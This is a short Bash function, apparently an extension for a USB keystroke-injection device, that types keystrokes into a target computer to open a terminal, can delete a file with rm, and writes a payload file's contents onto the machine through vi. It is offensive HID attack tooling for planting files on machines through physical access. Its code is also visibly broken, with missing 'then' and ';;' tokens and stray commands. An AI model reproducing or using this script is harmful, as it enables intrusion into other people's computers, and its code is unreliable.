#!/bin/bash
#
# DROP v1 by bg-wa
# Simplifies dropping files from HID attacks for various targets
# Usage: DROP [OS] [file to drop]
#
# Format:
# DROP [WIN OSX LINUX] bb_source_file.txt attack_destination_file.txt [overwrite]
# Example:
# DROP LINUX /root/udisk/payloads/$SWITCH_POSITION/source.txt ~/target_destination.txt true


function DROP() {
    local os=$1
    local source=$2
    local destination=$3
    local overwrite=$4
    echo "start" >> "/root/udisk/debug/drop1.txt"
   [[ -z "$os" || -z "$source" || -z "$destination"]] && exit 1 # OS Source and Destination parameters must be set

   case "$os" in
      WIN)
         QUACK GUI r
         QUACK DELAY 500
         QUACK STRING "$@"
         QUACK ENTER
         ;;
      OSX)
         RUN terminal
         QUACK STRING terminal
         QUACK ENTER
         QUACK DELAY 1000
         if $overwrite
            QUACK STRING rm "$destination"
            QUACK ENTER
            QUACK DELAY 500
         fi
         QUACK STRING vi "$destination"
         QUACK ENTER
         QUACK DELAY 500
         QUACK STRING i
      LINUX)
         echo "ok" >> "/root/udisk/debug/drop1.txt"
         QUACK ALT F2
         QUACK DELAY 500
         QUACK STRING "$@"
         QUACK DELAY 500
         QUACK ENTER
         quack 500
         QUACK STRING terminal
         QUACK ENTER
         QUACK DELAY 1000
         if $overwrite
            QUACK STRING rm "$destination"
            QUACK ENTER
            QUACK DELAY 500
         fi
         QUACK STRING vi "$destination"
         QUACK ENTER
         QUACK DELAY 500
         QUACK STRING i
         ;;
      *)
         # OS parameter must be one of the above
         exit 1
         ;;
   esac
   
   while IFS= read data
    do
        if [ "${data}" = " " ]
        then
           QUACK SPACE
        else
           QUACK STRING "$data"
        fi
    done < "$source"

    QUACK ESC
    QUACK STRING :x
    QUACK ENTER

}

export -f DROP
